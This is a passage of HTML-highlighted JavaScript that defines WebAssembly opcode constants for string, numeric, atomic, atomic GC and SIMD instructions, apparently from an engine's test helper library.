<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeUtf8 = <span class="hljs-number">0x92</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8Slice = <span class="hljs-number">0x93</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeLossyUtf8 = <span class="hljs-number">0x94</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeWtf8 = <span class="hljs-number">0x95</span>;
<span class="hljs-keyword">let</span> kExprStringAsWtf16 = <span class="hljs-number">0x98</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Length = <span class="hljs-number">0x99</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16GetCodeunit = <span class="hljs-number">0x9a</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Encode = <span class="hljs-number">0x9b</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Slice = <span class="hljs-number">0x9c</span>;
<span class="hljs-keyword">let</span> kExprStringAsIter = <span class="hljs-number">0xa0</span>;
<span class="hljs-keyword">let</span> kExprStringViewIterNext = <span class="hljs-number">0xa1</span>
<span class="hljs-keyword">let</span> kExprStringViewIterAdvance = <span class="hljs-number">0xa2</span>;
<span class="hljs-keyword">let</span> kExprStringViewIterRewind = <span class="hljs-number">0xa3</span>
<span class="hljs-keyword">let</span> kExprStringViewIterSlice = <span class="hljs-number">0xa4</span>;
<span class="hljs-keyword">let</span> kExprStringCompare = <span class="hljs-number">0xa8</span>;
<span class="hljs-keyword">let</span> kExprStringFromCodePoint = <span class="hljs-number">0xa9</span>;
<span class="hljs-keyword">let</span> kExprStringHash = <span class="hljs-number">0xaa</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8Array = <span class="hljs-number">0xb0</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf16Array = <span class="hljs-number">0xb1</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeUtf8Array = <span class="hljs-number">0xb2</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf16Array = <span class="hljs-number">0xb3</span>;
<span class="hljs-keyword">let</span> kExprStringNewLossyUtf8Array = <span class="hljs-number">0xb4</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf8Array = <span class="hljs-number">0xb5</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeLossyUtf8Array = <span class="hljs-number">0xb6</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf8Array = <span class="hljs-number">0xb7</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8ArrayTry = <span class="hljs-number">0xb8</span>;

<span class="hljs-comment">// Numeric opcodes.</span>
<span class="hljs-keyword">let</span> kExprI32SConvertSatF32 = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprI32UConvertSatF32 = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprI32SConvertSatF64 = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprI32UConvertSatF64 = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprI64SConvertSatF32 = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprI64UConvertSatF32 = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprI64SConvertSatF64 = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprI64UConvertSatF64 = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprMemoryInit = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprDataDrop = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprMemoryCopy = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprMemoryFill = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprTableInit = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprElemDrop = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprTableCopy = <span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kExprTableGrow = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprTableSize = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprTableFill = <span class="hljs-number">0x11</span>;

<span class="hljs-comment">// Atomic opcodes.</span>
<span class="hljs-keyword">let</span> kExprAtomicNotify = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicWait = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicWait = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprAtomicFence = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad8U = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad16U = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore8U = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore16U = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd8U = <span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd16U = <span class="hljs-number">0x21</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub8U = <span class="hljs-number">0x27</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub16U = <span class="hljs-number">0x28</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd = <span class="hljs-number">0x2c</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd8U = <span class="hljs-number">0x2e</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd16U = <span class="hljs-number">0x2f</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr = <span class="hljs-number">0x33</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr8U = <span class="hljs-number">0x35</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr16U = <span class="hljs-number">0x36</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor = <span class="hljs-number">0x3a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor8U = <span class="hljs-number">0x3c</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor16U = <span class="hljs-number">0x3d</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange = <span class="hljs-number">0x41</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange8U = <span class="hljs-number">0x43</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange16U = <span class="hljs-number">0x44</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange = <span class="hljs-number">0x48</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange8U = <span class="hljs-number">0x4a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange16U = <span class="hljs-number">0x4b</span>;

<span class="hljs-keyword">let</span> kExprI64AtomicLoad = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad8U = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad16U = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad32U = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore8U = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore16U = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore32U = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd = <span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd8U = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd16U = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd32U = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub = <span class="hljs-number">0x26</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub8U = <span class="hljs-number">0x29</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub16U = <span class="hljs-number">0x2a</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub32U = <span class="hljs-number">0x2b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd = <span class="hljs-number">0x2d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd8U = <span class="hljs-number">0x30</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd16U = <span class="hljs-number">0x31</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd32U = <span class="hljs-number">0x32</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr = <span class="hljs-number">0x34</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr8U = <span class="hljs-number">0x37</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr16U = <span class="hljs-number">0x38</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr32U = <span class="hljs-number">0x39</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor = <span class="hljs-number">0x3b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor8U = <span class="hljs-number">0x3e</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor16U = <span class="hljs-number">0x3f</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor32U = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange = <span class="hljs-number">0x42</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange8U = <span class="hljs-number">0x45</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange16U = <span class="hljs-number">0x46</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange32U = <span class="hljs-number">0x47</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange = <span class="hljs-number">0x49</span>
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange8U = <span class="hljs-number">0x4c</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange16U = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange32U = <span class="hljs-number">0x4e</span>;

<span class="hljs-comment">// Atomic GC opcodes (shared-everything-threads).</span>
<span class="hljs-keyword">const</span> kExprPause = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGet = <span class="hljs-number">0x5c</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGetS = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGetU = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicSet = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicAdd = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicSub = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicAnd = <span class="hljs-number">0x62</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicOr = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicXor = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicExchange = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicCompareExchange = <span class="hljs-number">0x66</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGet = <span class="hljs-number">0x67</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGetS = <span class="hljs-number">0x68</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGetU = <span class="hljs-number">0x69</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicSet = <span class="hljs-number">0x6a</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicAdd = <span class="hljs-number">0x6b</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicSub = <span class="hljs-number">0x6c</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicAnd = <span class="hljs-number">0x6d</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicOr = <span class="hljs-number">0x6e</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicXor = <span class="hljs-number">0x6f</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicExchange = <span class="hljs-number">0x70</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicCompareExchange = <span class="hljs-number">0x71</span>;

<span class="hljs-comment">// Simd opcodes.</span>
<span class="hljs-keyword">let</span> kExprS128LoadMem = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprS128Load8x8S = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprS128Load8x8U = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprS128Load16x4S = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprS128Load16x4U = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprS128Load32x2S = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprS128Load32x2U = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprS128Load8Splat = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprS128Load16Splat = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Splat = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Splat = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprS128StoreMem = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprS128Const = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprI8x16Shuffle = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprI8x16Swizzle = <span class="hljs-number">0x0e</span>;

<span class="hljs-keyword">let</span> kExprI8x16Splat = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprI16x8Splat = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprI32x4Splat = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprI64x2Splat = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprF32x4Splat = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprF64x2Splat = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprI8x16ExtractLaneS = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprI8x16ExtractLaneU = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprI8x16ReplaceLane = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtractLaneS = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtractLaneU = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprI16x8ReplaceLane = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtractLane = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprI32x4ReplaceLane = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtractLane = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI64x2ReplaceLane = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprF32x4ExtractLane = <span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">let</span> kExprF32x4ReplaceLane = <span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kExprF64x2ExtractLane = <span class="hljs-number">0x21</span>;
<span class="hljs-keyword">let</span> kExprF64x2ReplaceLane = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprI8x16Eq = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprI8x16Ne = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprI8x16LtS = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprI8x16LtU = <span class="hljs-number">0x26</span>;
<span class="hljs-keyword">let</span> kExprI8x16GtS = <span class="hljs-number">0x27</span>;
<span class="hljs-keyword">let</span> kExprI8x16GtU = <span class="hljs-number">0x28</span>;
<span class="hljs-keyword">let</span> kExprI8x16LeS = <span class="hljs-number">0x29</span>;
<span class="hljs-keyword">let</span> kExprI8x16LeU = <span class="hljs-number">0x2a</span>;
<span class="hljs-keyword">let</span> kExprI8x16GeS = <span class="hljs-number">0x2b</span>;
<span class="hljs-keyword">let</span> kExprI8x16GeU = <span class="hljs-number">0x2c</span>;
<span class="hljs-keyword">let</span> kExprI16x8Eq = <span class="hljs-number">0x2d</span>;
<span class="hljs-keyword">let</span> kExprI16x8Ne = <span class="hljs-number">0x2e</span>;
<span class="hljs-keyword">let</span> kExprI16x8LtS = <span class="hljs-number">0x2f</span>;
<span class="hljs-keyword">let</span> kExprI16x8LtU = <span class="hljs-number">0x30</span>;
<span class="hljs-keyword">let</span> kExprI16x8GtS = <span class="hljs-number">0x31</span>;
<span class="hljs-keyword">let</span> kExprI16x8GtU = <span class="hljs-number">0x32</span>;
<span class="hljs-keyword">let</span> kExprI16x8LeS = <span class="hljs-number">0x33</span>;
<span class="hljs-keyword">let</span> kExprI16x8LeU = <span class="hljs-number">0x34</span>;
<span class="hljs-keyword">let</span> kExprI16x8GeS = <span class="hljs-number">0x35</span>;
<span class="hljs-keyword">let</span> kExprI16x8GeU = <span class="hljs-number">0x36</span>;
<span class="hljs-keyword">let</span> kExprI32x4Eq = <span class="hljs-number">0x37</span>;
<span class="hljs-keyword">let</span> kExprI32x4Ne = <span class="hljs-number">0x38</span>;
<span class="hljs-keyword">let</span> kExprI32x4LtS = <span class="hljs-number">0x39</span>;
<span class="hljs-keyword">let</span> kExprI32x4LtU = <span class="hljs-number">0x3a</span>;
<span class="hljs-keyword">let</span> kExprI32x4GtS = <span class="hljs-number">0x3b</span>;
<span class="hljs-keyword">let</span> kExprI32x4GtU = <span class="hljs-number">0x3c</span>;
<span class="hljs-keyword">let</span> kExprI32x4LeS = <span class="hljs-number">0x3d</span>;
<span class="hljs-keyword">let</span> kExprI32x4LeU = <span class="hljs-number">0x3e</span>;
<span class="hljs-keyword">let</span> kExprI32x4GeS = <span class="hljs-number">0x3f</span>;
<span class="hljs-keyword">let</span> kExprI32x4GeU = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kExprF32x4Eq = <span class="hljs-number">0x41</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ne = <span class="hljs-number">0x42</span>;
<span class="hljs-keyword">let</span> kExprF32x4Lt = <span class="hljs-number">0x43</span>;
<span class="hljs-keyword">let</span> kExprF32x4Gt = <span class="hljs-number">0x44</span>;
<span class="hljs-keyword">let</span> kExprF32x4Le = <span class="hljs-number">0x45</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ge = <span class="hljs-number">0x46</span>;
<span class="hljs-keyword">let</span> kExprF64x2Eq = <span class="hljs-number">0x47</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ne = <span class="hljs-number">0x48</span>;
<span class="hljs-keyword">let</span> kExprF64x2Lt = <span class="hljs-number">0x49</span>;
<span class="hljs-keyword">let</span> kExprF64x2Gt = <span class="hljs-number">0x4a</span>;
<span class="hljs-keyword">let</span> kExprF64x2Le = <span class="hljs-number">0x4b</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ge = <span class="hljs-number">0x4c</span>;
<span class="hljs-keyword">let</span> kExprS128Not = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kExprS128And = <span class="hljs-number">0x4e</span>;
<span class="hljs-keyword">let</span> kExprS128AndNot = <span class="hljs-number">0x4f</span>;
<span class="hljs-keyword">let</span> kExprS128Or = <span class="hljs-number">0x50</span>;
<span class="hljs-keyword">let</span> kExprS128Xor = <span class="hljs-number">0x51</span>;
<span class="hljs-keyword">let</span> kExprS128Select = <span class="hljs-number">0x52</span>;
<span class="hljs-keyword">let</span> kExprV128AnyTrue = <span class="hljs-number">0x53</span>;
<span class="hljs-keyword">let</span> kExprS128Load8Lane = <span class="hljs-number">0x54</span>;
<span class="hljs-keyword">let</span> kExprS128Load16Lane = <span class="hljs-number">0x55</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Lane = <span class="hljs-number">0x56</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Lane = <span class="hljs-number">0x57</span>;
<span class="hljs-keyword">let</span> kExprS128Store8Lane = <span class="hljs-number">0x58</span>;
<span class="hljs-keyword">let</span> kExprS128Store16Lane = <span class="hljs-number">0x59</span>;
<span class="hljs-keyword">let</span> kExprS128Store32Lane = <span class="hljs-number">0x5a</span>;
<span class="hljs-keyword">let</span> kExprS128Store64Lane = <span class="hljs-number">0x5b</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Zero = <span class="hljs-number">0x5c</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Zero = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">let</span> kExprF32x4DemoteF64x2Zero = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">let</span> kExprF64x2PromoteLowF32x4 = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">let</span> kExprI8x16Abs = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">let</span> kExprI8x16Neg = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">let</span> kExprI8x16Popcnt = <span class="hljs-number">0x62</span>;
<span class="hljs-keyword">let</span> kExprI8x16AllTrue = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">let</span> kExprI8x16BitMask = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">let</span> kExprI8x16SConvertI16x8 = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">let</span> kExprI8x16UConvertI16x8 = <span class="hljs-number">0x66</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ceil = <span class="hljs-number">0x67</span>;
<span class="hljs-keyword">let</span> kExprF32x4Floor = <span class="hljs-number">0x68</span>;
<span class="hljs-keyword">let</span> kExprF32x4Trunc = <span class="hljs-number">0x69</span>;
<span class="hljs-keyword">let</span> kExprF32x4NearestInt = <span class="hljs-number">0x6a</span>;
<span class="hljs-keyword">let</span> kExprI8x16Shl = <span class="hljs-number">0x6b</span>;
<span class="hljs-keyword">let</span> kExprI8x16ShrS = <span class="hljs-number">0x6c</span>;
<span class="hljs-keyword">let</span> kExprI8x16ShrU = <span class="hljs-number">0x6d</span>;
<span class="hljs-keyword">let</span> kExprI8x16Add = <span class="hljs-number">0x6e</span>;
<span class="hljs-keyword">let</span> kExprI8x16AddSatS = <span class="hljs-number">0x6f</span>;
<span class="hljs-keyword">let</span> kExprI8x16AddSatU = <span class="hljs-number">0x70</span>;
<span class="hljs-keyword">let</span> kExprI8x16Sub = <span class="hljs-number">0x71</span>;
<span class="hljs-keyword">let</span> kExprI8x16SubSatS = <span class="hljs-number">0x72</span>;
<span class="hljs-keyword">let</span> kExprI8x16SubSatU = <span class="hljs-number">0x73</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ceil = <span class="hljs-number">0x74</span>;
<span class="hljs-keyword">let</span> kExprF64x2Floor = <span class="hljs-number">0x75</span>;
<span class="hljs-keyword">let</span> kExprI8x16MinS = <span class="hljs-number">0x76</span>;
<span class="hljs-keyword">let</span> kExprI8x16MinU = <span class="hljs-number">0x77</span>;
<span class="hljs-keyword">let</span> kExprI8x16MaxS = <span class="hljs-number">0x78</span>;
<span class="hljs-keyword">let</span> kExprI8x16MaxU = <span class="hljs-number">0x79</span>;
<span class="hljs-keyword">let</span> kExprF64x2Trunc = <span class="hljs-number">0x7a</span>;
<span class="hljs-keyword">let</span> kExprI8x16RoundingAverageU = <span class="hljs-number">0x7b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtAddPairwiseI8x16S = <span class="hljs-number">0x7c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtAddPairwiseI8x16U = <span class="hljs-number">0x7d</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtAddPairwiseI16x8S = <span class="hljs-number">0x7e</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtAddPairwiseI16x8U = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kExprI16x8Abs = <span class="hljs-number">0x80</span>;
<span class="hljs-keyword">let</span> kExprI16x8Neg = <span class="hljs-number">0x81</span>;
<span class="hljs-keyword">let</span> kExprI16x8Q15MulRSatS = <span class="hljs-number">0x82</span>;
<span class="hljs-keyword">let</span> kExprI16x8AllTrue = <span class="hljs-number">0x83</span>;
<span class="hljs-keyword">let</span> kExprI16x8BitMask = <span class="hljs-number">0x84</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI32x4 = <span class="hljs-number">0x85</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI32x4 = <span class="hljs-number">0x86</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI8x16Low = <span class="hljs-number">0x87</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI8x16High = <span class="hljs-number">0x88</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI8x16Low = <span class="hljs-number">0x89</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI8x16High = <span class="hljs-number">0x8a</span>;
<span class="hljs-keyword">let</span> kExprI16x8Shl = <span class="hljs-number">0x8b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ShrS = <span class="hljs-number">0x8c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ShrU = <span class="hljs-number">0x8d</span>;
<span class="hljs-keyword">let</span> kExprI16x8Add = <span class="hljs-number">0x8e</span>;
<span class="hljs-keyword">let</span> kExprI16x8AddSatS = <span class="hljs-number">0x8f</span>;
<span class="hljs-keyword">let</span> kExprI16x8AddSatU = <span class="hljs-number">0x90</span>;
<span class="hljs-keyword">let</span> kExprI16x8Sub = <span class="hljs-number">0x91</span>;
<span class="hljs-keyword">let</span> kExprI16x8SubSatS = <span class="hljs-number">0x92</span>;
<span class="hljs-keyword">let</span> kExprI16x8SubSatU = <span class="hljs-number">0x93</span>;
<span class="hljs-keyword">let</span> kExprF64x2NearestInt = <span class="hljs-number">0x94</span>;
<span class="hljs-keyword">let</span> kExprI16x8Mul = <span class="hljs-number">0x95</span>;
<span class="hljs-keyword">let</span> kExprI16x8MinS = <span class="hljs-number">0x96</span>;
<span class="hljs-keyword">let</span> kExprI16x8MinU = <span class="hljs-number">0x97</span>;
<span class="hljs-keyword">let</span> kExprI16x8MaxS = <span class="hljs-number">0x98</span>;
<span class="hljs-keyword">let</span> kExprI16x8MaxU = <span class="hljs-number">0x99</span>;
<span class="hljs-keyword">let</span> kExprI16x8RoundingAverageU = <span class="hljs-number">0x9b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulLowI8x16S = <span class="hljs-number">0x9c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulHighI8x16S = <span class="hljs-number">0x9d</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulLowI8x16U = <span class="hljs-number">0x9e</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulHighI8x16U = <span class="hljs-number">0x9f</span>;
<span class="hljs-keyword">let</span> kExprI32x4Abs = <span class="hljs-number">0xa0</span>;
<span class="hljs-keyword">let</span> kExprI32x4Neg = <span class="hljs-number">0xa1</span>;
<span class="hljs-keyword">let</span> kExprI32x4AllTrue = <span class="hljs-number">0xa3</span>;
<span class="hljs-keyword">let</span> kExprI32x4BitMask = <span class="hljs-number">0xa4</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertI16x8Low = <span class="hljs-number">0xa7</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertI16x8High = <span class="hljs-number">0xa8</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertI16x8Low = <span class="hljs-number">0xa9</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertI16x8High = <span class="hljs-number">0xaa</span>;
<span class="hljs-keyword">let</span> kExprI32x4Shl = <span class="hljs-number">0xab</span>;
<span class="hljs-keyword">let</span> kExprI32x4ShrS = <span class="hljs-number">0xac</span>;
<span class="hljs-keyword">let</span> kExprI32x4ShrU = <span class="hljs-number">0xad</span>;
<span class="hljs-keyword">let</span> kExprI32x4Add = <span class="hljs-number">0xae</span>;
<span class="hljs-keyword">let</span> kExprI32x4Sub = <span class="hljs-number">0xb1</span>;
<span class="hljs-keyword">let</span> kExprI32x4Mul = <span class="hljs-number">0xb5</span>;
<span class="hljs-keyword">let</span> kExprI32x4MinS = <span class="hljs-number">0xb6</span>;
<span class="hljs-keyword">let</span> kExprI32x4MinU = <span class="hljs-number">0xb7</span>;
<span class="hljs-keyword">let</span> kExprI32x4MaxS = <span class="hljs-number">0xb8</span>;
<span class="hljs-keyword">let</span> kExprI32x4MaxU = <span class="hljs-number">0xb9</span>;
<span class="hljs-keyword">let</span> kExprI32x4DotI16x8S = <span class="hljs-number">0xba</span>;
